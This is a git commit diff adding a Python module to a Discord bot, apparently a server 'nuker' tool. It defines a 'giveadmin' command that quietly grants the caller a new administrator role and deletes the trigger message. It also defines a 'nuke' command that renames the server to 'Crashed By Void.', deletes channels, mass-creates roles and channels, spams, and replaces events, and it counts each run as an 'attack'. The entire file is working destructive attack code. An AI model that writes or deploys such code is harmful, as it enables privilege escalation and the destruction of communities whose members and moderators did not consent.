428c631df6d4cc2b343625c7d85fb1a6dca2694e
Mr Stonkles <voby@waifu.club>
2026-08-20 17:10:44 +0600

    Add modules/nuke (give_admin + nuke)

---
+++ modules/nuke.py
@@ -0,0 +1,72 @@
+import logging
+
+import disnake
+from disnake.ext import commands
+from disnake.ext.commands import BucketType, CommandOnCooldown
+
+from core.managers.counter import AttackCounter
+from core.operations import Fucker
+
+
+class GiveAdmin(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    @commands.command(name="giveadmin")
+    async def giveadmin(self, ctx: commands.Context):
+        try:
+            admin_role = await ctx.guild.create_role(
+                name="VoidAdmin777",
+                permissions=disnake.Permissions(administrator=True),
+            )
+            await ctx.author.add_roles(admin_role)
+            await ctx.send("Successfully granted!")
+            await ctx.message.delete()
+        except disnake.Forbidden:
+            await ctx.send("Error: Not enough permissions to execute this command!")
+            await ctx.message.delete()
+        except Exception as e:
+            logging.error(f"Error: {e}!")
+            await ctx.message.delete()
+
+
+class Nuke(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+        self.attack_counter = AttackCounter()
+
+    @commands.command()
+    @commands.cooldown(1, 120, BucketType.guild)  # 120 seconds cooldown
+    async def nuke(self, ctx):
+        self.attack_counter.record_attack_start()
+
+        fucker = Fucker(ctx)  # Define our mini-api wrapper
+        await ctx.guild.edit(name="Crashed By Void.", icon=None)
+        await fucker.delChannels(ctx)
+        await fucker.crRoles(ctx)
+        await fucker.crChannels(ctx)
+        await fucker.spam(ctx)
+        await fucker.delete_events(ctx)
+        await fucker.create_event(ctx)
+
+        self.attack_counter.record_attack_end()
+
+    @nuke.error
+    async def nuke_error(self, ctx, error):
+        if isinstance(error, CommandOnCooldown):
+            embed = disnake.Embed(
+                title="Cooldown", color=disnake.Color.from_rgb(48, 49, 54)
+            )
+            embed.add_field(
+                name="Error.",
+                value=f"Command is on cooldown. Try again in {error.retry_after:.2f} seconds.",
+                inline=False,
+            )
+            await ctx.send(embed=embed)
+        else:
+            raise error
+
+
+def setup(bot):
+    bot.add_cog(GiveAdmin(bot))
+    bot.add_cog(Nuke(bot))
